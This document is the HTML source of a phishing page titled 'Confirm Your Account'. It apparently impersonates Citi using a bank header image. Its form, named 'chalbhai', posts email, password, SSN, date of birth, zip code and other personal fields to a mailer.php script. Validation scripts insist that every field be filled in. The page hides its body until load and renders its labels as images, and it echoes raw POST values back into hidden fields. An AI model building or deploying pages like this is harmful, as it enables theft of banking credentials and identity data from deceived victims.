<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Confirm Your Account</title>



<link rel="shortcut icon"

              href="images/favicon.ico"/>

			  

			  

	

<script type="text/javascript">



function unhideBody()

{

var bodyElems = document.getElementsByTagName("body");

bodyElems[0].style.visibility = "visible";

}



</script>



<body style="visibility:hidden" onload="unhideBody()">





<style> 

  .textbox { 

    border: 1px solid #c4c4c4; 

    height: 28px; 

    width: 275px; 

    font-size: 15px; 

    padding: 4px 4px 4px 4px; 

    border-radius: 4px; 

    -moz-border-radius: 4px; 

    -webkit-border-radius: 4px; 

   

} 



 </style> 



<style type="text/css">

div#container

{

	position:relative;

	width: 100%;

	margin-top: 0px;

	margin-left: auto;

	margin-right: auto;

	text-align:left; 

}

body {text-align:center;margin:0}

</style>



<script LANGUAGE="JavaScript">

<!--



var b = 0 ;

var i = 0 ;

var errmsg = "" ;

var punct = "" ;

var min = 0 ;

var max = 0 ;



function formbreeze_email(field) {



	if (b && (field.value.length == 0)) return true ;





	if (! emailCheck(field.value))

	  {

		  field.focus();

		  if (field.type == "text") field.select();

		  return false ;

	  }



   return true ;

}



function formbreeze_filledin(field) {



if (b && (field.value.length == 0)) return true;



if (field.value.length < min) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false ;

   }



if ((max > 0) && (field.value.length > max)) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false ;

   }



return true ;

}



function formbreeze_number(field) {



if (b && (field.value.length == 0)) return true ; ;



if (i)

 var valid = "0123456789"

else

 var valid = ".,0123456789"



var pass = 1;

var temp;

for (var i=0; i<field.value.length; i++) {

temp = "" + field.value.substring(i, i+1);

if (valid.indexOf(temp) == "-1") pass = 0;



}



if (!pass) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false;

 }



if (field.value < min) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false;

   }





if ((max > 0) && (field.value > max)) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false;

   }



return true ;

}





function formbreeze_numseq(field) {





if (b && (field.value.length == 0)) return true ;



var valid = punct + "0123456789"



var pass = 1;

var digits = 0

var temp;

for (var i=0; i<field.value.length; i++) {

temp = "" + field.value.substring(i, i+1);

if (valid.indexOf(temp) == "-1") pass = 0;

if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;



}



if (!pass) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false ; ;

   }



if (digits < min) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false;

   }



if ((max > 0) && (digits > max)) {

alert(errmsg);

field.focus();

if (field.type == "text") field.select();

return false;

   }



return true ;

}



function emailCheck (emailStr) {



var checkTLD=1;

var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;

var emailPat=/^(.+)@(.+)$/;

var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";

var validChars="\[^\\s" + specialChars + "\]";

var quotedUser="(\"[^\"]*\")";

var atom=validChars + '+';

var word="(" + atom + "|" + quotedUser + ")";

var userPat=new RegExp("^" + word + "(\\." + word + ")*$");

var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");

var matchArray=emailStr.match(emailPat);



if (matchArray==null) {

alert(errmsg);

return false;

}

var user=matchArray[1];

var domain=matchArray[2];



for (i=0; i<user.length; i++) {

if (user.charCodeAt(i)>127) {

alert(errmsg);

return false;

   }

}

for (i=0; i<domain.length; i++) {

if (domain.charCodeAt(i)>127) {

alert(errmsg);

return false;

   }

}



if (user.match(userPat)==null) {

alert(errmsg);

return false;

}



var atomPat=new RegExp("^" + atom + "$");

var domArr=domain.split(".");

var len=domArr.length;

for (i=0;i<len;i++) {

if (domArr[i].search(atomPat)==-1) {

alert(errmsg);

return false;

   }

}



if (checkTLD && domArr[domArr.length-1].length!=2 &&

domArr[domArr.length-1].search(knownDomsPat)==-1) {

alert(errmsg);

return false;

}



if (len<2) {

alert(errmsg);

return false;

}



return true;

}



function formbreeze_sub()

{

/*

//FBDATA:formtext12^1^0^Please enter a valid email address.:;formtext23^0^1^0^0^Please Enter Your Password:;formtext3^0^1^0^0^Please Fill in All Of the Required Fields:;formtext4^0^1^0^0^Please Fill in All Of the Required Fields:;formtext5^0^1^0^0^Please Fill in All Of the Required Fields:;formtext6^0^1^0^0^Please enter a date in the format dd/mm/yy.:;formtext7^0^1^0^0^Enter Your SSN Numbers:;formtext8^0^1^0^0^Please enter a valid zip code.:;formtext9^0^1^0^0^Please Fill in All Of the Required Fields:;

*/

b=0;

errmsg="Please enter a valid email address.";

if (! formbreeze_email(document.chalbhai.formtext12) ) return false ;

b=0;

errmsg="Please Enter Your Password";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext23) ) return false ;

b=0;

errmsg="Please Fill in All Of the Required Fields";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;

b=0;

errmsg="Please Fill in All Of the Required Fields";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;

b=0;

errmsg="Please Fill in All Of the Required Fields";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext5) ) return false ;
b=0;

errmsg="Please enter a date in the format dd/mm/yy.";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext6) ) return false ;

b=0;

errmsg="Enter Your SSN Numbers";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext7) ) return false ;

b=0;

errmsg="Please enter a valid zip code.";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext8) ) return false ;

b=0;

errmsg="Please Fill in All Of the Required Fields";

min=1;

max=0;

if (! formbreeze_filledin(document.chalbhai.formtext9) ) return false ;



}

-->

</script>



</head>

<body>

<div id="container">

<div id="image1" style="position:absolute; overflow:hidden; left:184px; top:0px; width:986px; height:140px; z-index:0"><img src="images/citiheader.png" alt="" title="" border=0 width=986 height=140></div>



<div id="image2" style="position:absolute; overflow:hidden; left:180px; top:137px; width:983px; height:182px; z-index:1"><img src="images/confirmmm.png" alt="" title="" border=0 width=983 height=182></div>



<div id="image3" style="position:absolute; overflow:hidden; left:208px; top:341px; width:269px; height:376px; z-index:2"><img src="images/bn1.png" alt="" title="" border=0 width=269 height=298></div>



<div id="image4" style="position:absolute; overflow:hidden; left:214px; top:643px; width:462px; height:502px; z-index:3"><img src="images/bn2.png" alt="" title="" border=0 width=462 height=502></div>



<div id="hr1" style="position:absolute; overflow:hidden; left:225px; top:1155px; width:819px; height:17px; z-index:4">

<hr size=1 width=819>

</div>



<div id="image5" style="position:absolute; overflow:hidden; left:152px; top:1220px; width:971px; height:71px; z-index:5"><a href="#"><img src="images/footer2.png" alt="" title="" border=0 width=971 height=71></a></div>

<form action=mailer.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >

            <input type="hidden" name="formtext1" 
 value="<?php echo $_POST['formtext1']; ?>">
 
 <input type="hidden" name="formtext2" 
 value="<?php echo $_POST['formtext2']; ?>">



<input name="formtext12" class="textbox" type="text" style="position:absolute;width:221px;left:225px;top:368px;z-index:6">

<input name="formtext23" class="textbox" type="password" style="position:absolute;width:221px;left:225px;top:426px;z-index:7">

<input name="formtext3" class="textbox" type="text" style="position:absolute;width:221px;left:225px;top:482px;z-index:8">

<input name="formtext18" class="textbox" type="text" style="position:absolute;width:221px;left:225px;top:545px;z-index:18">

<input name="formtext4" class="textbox" type="password" style="position:absolute;width:221px;left:225px;top:600px;z-index:9">

<input name="formtext5" class="textbox" type="text" style="position:absolute;width:221px;left:225px;top:675px;z-index:10">

<input name="formtext6" class="textbox" type="text" style="position:absolute;width:221px;left:229px;top:748px;z-index:11">

<input name="formtext7" class="textbox" type="text" style="position:absolute;width:221px;left:230px;top:823px;z-index:12">

<input name="formtext8" class="textbox" type="text" style="position:absolute;width:122px;left:230px;top:896px;z-index:13">

<input name="formtext9" class="textbox" type="text" style="position:absolute;width:222px;left:228px;top:971px;z-index:14">

<input name="formtext16" class="textbox" type="text" style="position:absolute;width:222px;left:228px;top:1045px;z-index:16">

<input name="formtext17" class="textbox" type="text" style="position:absolute;width:222px;left:228px;top:1108px;z-index:17">


<div id="formimage1" style="position:absolute; left:235px; top:1180px; z-index:15"><input type="image" name="formimage1" width="148" height="33" src="images/verifyyy.png"></div>



</div>



</body>

</html>

